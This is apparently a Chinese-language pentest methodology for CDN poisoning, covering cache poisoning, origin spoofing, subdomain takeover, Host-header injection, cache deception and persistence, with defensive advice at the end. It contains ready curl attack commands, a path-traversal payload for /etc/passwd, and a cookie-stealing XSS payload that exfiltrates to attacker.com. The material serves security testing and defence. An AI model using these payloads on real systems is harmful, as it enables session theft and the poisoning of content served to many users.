# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的 CDN 投毒（CDN Poisoning）攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用内容分发网络（CDN）中的安全漏洞，包括缓存投毒、源站欺骗、子域接管、HTTPS 证书滥用等技术。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 CDN 加速的 Web 应用
- 从 CDN 加载第三方脚本的网站
- 使用 CDN 提供静态资源的服务
- 依赖 CDN 进行软件分发的应用
- 使用 CDN 进行 API 加速的服务

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 Web 安全评估的顾问
- 负责 CDN 配置的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：CDN 投毒攻击

### 2.1 技术介绍

CDN 投毒（CDN Poisoning）是一种针对内容分发网络的攻击，攻击者通过向 CDN 缓存注入恶意内容，使所有从 CDN 获取资源的用户受到攻击。

**攻击原理：**
- **缓存投毒：** 向 CDN 注入恶意内容，污染共享缓存
- **源站欺骗：** 欺骗 CDN 从恶意源站获取内容
- **子域接管：** 接管未正确配置的 CDN 子域
- **Host 头注入：** 利用 Host 头欺骗 CDN 回源
- **HTTPS 证书滥用：** 利用无效或过期证书欺骗 CDN
- **Cache Key 操纵：** 操纵缓存键绕过安全控制

**本质：** CDN 为了性能优化而缓存内容，但如果缓存验证机制不完善，恶意内容将被分发给所有用户。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **电商网站** | 加载支付脚本、统计脚本 | 第三方脚本从 CDN 加载被篡改 |
| **SaaS 应用** | 前端资源 CDN 加速 | 静态资源被替换为恶意版本 |
| **软件下载** | 安装包 CDN 分发 | 下载文件被替换为恶意软件 |
| **API 服务** | API 响应 CDN 缓存 | API 响应被缓存投毒 |
| **新闻门户** | 图片/视频 CDN 托管 | 媒体内容被替换 |
| **金融网站** | 交易脚本加载 | 交易逻辑被篡改 |
| **政府网站** | 公告/文件下载 | 官方文件被替换 |
| **游戏平台** | 游戏资源/补丁下载 | 游戏文件被篡改 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**CDN 识别：**

1. **识别 CDN 提供商**
   ```bash
   # 检查响应头
   curl -I https://target.com/static/app.js
   
   # 常见 CDN 标识头
   Server: cloudflare
   X-Cache: Hit from cloudfront
   Via: 1.1 varnish
   X-Served-By: Fastly
   ```

2. **识别 CDN 域名**
   ```bash
   # 查找 CDN 相关域名
   dig target.com
   dig cdn.target.com
   dig static.target.com
   dig assets.target.com
   
   # 检查 CNAME 记录
   dig CNAME cdn.target.com
   ```

3. **测试缓存行为**
   ```bash
   # 测试缓存命中
   curl -I https://target.com/static/test.txt
   # 第一次：X-Cache: MISS
   # 第二次：X-Cache: HIT
   
   # 测试缓存键
   curl -I https://target.com/static/test.txt?foo=bar
   curl -I https://target.com/static/test.txt?foo=baz
   # 如果都返回 HIT，说明查询参数不在缓存键中
   ```

#### 2.3.2 白盒测试

**配置审计要点：**

1. **检查 CDN 配置**
   - 缓存规则配置
   - 源站配置
   - HTTPS 证书配置
   - 访问控制配置

2. **审计源站响应头**
   ```http
   # 危险的响应头配置
   Cache-Control: public, max-age=31536000  # 缓存时间过长
   Vary: *  # 可能导致缓存分裂
   ```

3. **检查 CORS 配置**
   ```http
   # 危险的 CORS 配置
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   ```

### 2.4 漏洞利用方法

#### 2.4.1 缓存投毒攻击

**方法 1：通过用户可控参数投毒**

```bash
# 步骤 1：识别缓存键不包含的参数
# 假设 CDN 配置为忽略查询参数进行缓存

# 步骤 2：发送恶意请求
curl "https://cdn.target.com/api/user?callback=<script>alert(1)</script>"

# 步骤 3：恶意响应被缓存
# 其他用户访问时将获取恶意响应
curl "https://cdn.target.com/api/user"
```

**方法 2：通过 HTTP 头投毒**

```bash
# 利用 X-Forwarded-Host 头投毒
curl -H "X-Forwarded-Host: attacker.com" https://cdn.target.com/

# 如果源站使用该头生成内容，恶意内容可能被缓存
```

**方法 3：通过 Cookie 投毒**

```bash
# 设置恶意 Cookie
curl -H "Cookie: session=malicious_payload" https://cdn.target.com/

# 如果 Cookie 不在缓存键中，恶意响应可能被缓存
```

#### 2.4.2 源站欺骗攻击

**攻击步骤：**

```bash
# 步骤 1：识别源站 IP
# 通过历史 DNS 记录或扫描获取源站

# 步骤 2：直接访问源站
curl -H "Host: target.com" http://origin-ip/

# 步骤 3：如果源站未验证 Host 头，可以请求恶意内容
curl -H "Host: target.com" http://origin-ip/?injection=malicious

# 步骤 4：CDN 回源时可能获取恶意内容
```

#### 2.4.3 子域接管攻击

**检测未配置的 CDN 子域：**

```bash
# 步骤 1：检查 CNAME 记录
dig CNAME cdn.target.com
# 返回：cdn.target.com. CNAME target.cdnprovider.com

# 步骤 2：检查 CDN 端点是否存在
# 访问 target.cdnprovider.com，如果返回 404 或配置页面
# 说明子域可能被接管

# 步骤 3：在 CDN 提供商处注册相同子域
# 注册 target.cdnprovider.com
# 现在你控制了 cdn.target.com 的内容
```

**常见 CDN 子域接管场景：**

| CDN 提供商 | 检查命令 | 接管条件 |
|-----------|---------|---------|
| **Cloudflare** | `dig CNAME cdn.target.com` | CNAME 指向不存在的 Zone |
| **AWS CloudFront** | `dig CNAME cdn.target.com` | CNAME 指向未配置的 Distribution |
| **Azure CDN** | `dig CNAME cdn.target.com` | CNAME 指向未配置的 Endpoint |
| **Fastly** | `dig CNAME cdn.target.com` | CNAME 指向未配置的服务 |

#### 2.4.4 Host 头攻击

**攻击步骤：**

```bash
# 步骤 1：测试 Host 头注入
curl -H "Host: evil.com" https://cdn.target.com/

# 步骤 2：如果源站响应包含 Host 头内容
# 可能生成恶意内容并被缓存

# 步骤 3：利用 X-Forwarded-Host
curl -H "X-Forwarded-Host: evil.com" https://cdn.target.com/

# 步骤 4：检查响应是否包含恶意 Host
```

#### 2.4.5 缓存欺骗攻击

**利用文件扩展名缓存差异：**

```bash
# 步骤 1：请求不存在的文件
curl https://cdn.target.com/nonexistent.css

# 步骤 2：如果 CDN 根据扩展名缓存
# .css 文件可能被缓存为 404

# 步骤 3：创建真实的 CSS 文件
# 用户将无法加载该 CSS（缓存的 404）

# 或者利用未授权访问
curl https://cdn.target.com/admin/../../../etc/passwd.css
# 如果路径遍历成功且.css 被缓存，敏感信息被泄露
```

#### 2.4.6 信息收集命令

```bash
# 识别 CDN 配置
curl -I https://cdn.target.com/static/app.js

# 检查缓存状态
curl -I https://cdn.target.com/static/test.txt

# 识别源站
dig target.com
dig www.target.com

# 检查 CDN 域名
nslookup cdn.target.com
host cdn.target.com

# 检查证书
openssl s_client -connect cdn.target.com:443 -servername cdn.target.com
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过缓存验证

**方法 1：利用缓存键缺陷**
```bash
# 如果 CDN 不缓存带查询参数的请求
# 使用 URL 编码绕过
curl "https://cdn.target.com/api/data%3Ffoo=bar"

# 或使用 Fragment（通常不发送到服务器）
curl "https://cdn.target.com/api/data#foo=bar"
```

**方法 2：利用 Vary 头缺陷**
```bash
# 如果 Vary 头配置不当
# 可以通过修改请求头绕过缓存
curl -H "Accept-Encoding: gzip" https://cdn.target.com/
curl -H "Accept-Encoding: br" https://cdn.target.com/
# 不同编码可能有不同缓存
```

#### 2.5.2 绕过源站保护

**方法 1：IP 轮换**
```bash
# 如果源站限制请求频率
# 使用代理池轮换 IP
for ip in $(cat proxy_list.txt); do
  curl -x $ip -H "Host: target.com" http://origin-ip/
done
```

**方法 2：User-Agent 绕过**
```bash
# 如果源站只允许 CDN User-Agent
curl -H "User-Agent: Amazon CloudFront" http://origin-ip/
```

#### 2.5.3 绕过 HTTPS 验证

**方法 1：证书不匹配利用**
```bash
# 如果 CDN 未严格验证源站证书
curl -k -H "Host: target.com" https://origin-ip/
```

**方法 2：自签名证书**
```bash
# 在某些配置下，CDN 可能接受自签名证书
# 可以设置恶意源站使用自签名证书
```

#### 2.5.4 持久化技术

**DNS 持久化：**
```bash
# 如果成功接管子域
# 修改 DNS 记录指向恶意 CDN
# 即使原始配置恢复，DNS TTL 内攻击仍有效
```

**缓存持久化：**
```bash
# 设置长缓存时间
Cache-Control: public, max-age=604800  # 7 天
# 恶意内容将在 CDN 缓存 7 天
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **XSS 投毒** | JS 文件 | `<script>document.location='http://attacker.com/?c='+document.cookie</script>` | 窃取 Cookie |
| **缓存投毒** | API 响应 | `{"status":"error","message":"<script>alert(1)</script>"}` | 缓存恶意 JSON |
| **子域接管** | CDN 子域 | 在 CDN 注册相同子域 | 接管 cdn.target.com |
| **Host 注入** | 源站 | `-H "Host: attacker.com"` | 欺骗源站 |
| **缓存欺骗** | 敏感文件 | `/admin/../../../etc/passwd.css` | 利用扩展名缓存 |
| **源站发现** | IP 扫描 | `dig target.com +short` | 发现源站 IP |

## 3.2 常见 CDN 缓存键配置

| CDN 提供商 | 默认缓存键 | 可配置项 |
|-----------|-----------|---------|
| **Cloudflare** | URL + Host | Query String, Cookie, Header |
| **AWS CloudFront** | URL + Host + Query String | Header, Cookie, Query String |
| **Akamai** | URL + Host | Query String, Header, Cookie |
| **Fastly** | URL + Host | Query String, Header, Cookie |
| **Azure CDN** | URL + Host | Query String, Header |

## 3.3 CDN 安全检查清单

- [ ] CDN 子域正确配置且未接管风险
- [ ] 源站 IP 未暴露
- [ ] 源站验证 Host 头
- [ ] 缓存键配置合理
- [ ] 敏感资源不缓存
- [ ] HTTPS 证书有效且匹配
- [ ] CORS 配置安全
- [ ] 缓存时间合理
- [ ] WAF 规则已启用
- [ ] 访问日志已记录

## 3.4 防御建议

1. **子域管理**：定期审计 CDN 子域配置，及时清理未使用的子域
2. **源站保护**：源站只接受来自 CDN 的请求，验证 Host 头
3. **缓存配置**：合理配置缓存键，避免用户可控参数影响缓存
4. **HTTPS 强制**：CDN 到源站使用 HTTPS 并验证证书
5. **敏感数据**：敏感数据和动态内容不通过 CDN 缓存
6. **缓存控制**：使用 Cache-Control 头控制缓存行为
7. **监控告警**：监控 CDN 流量和缓存命中率异常
8. **定期审计**：定期检查 CDN 配置和源站响应
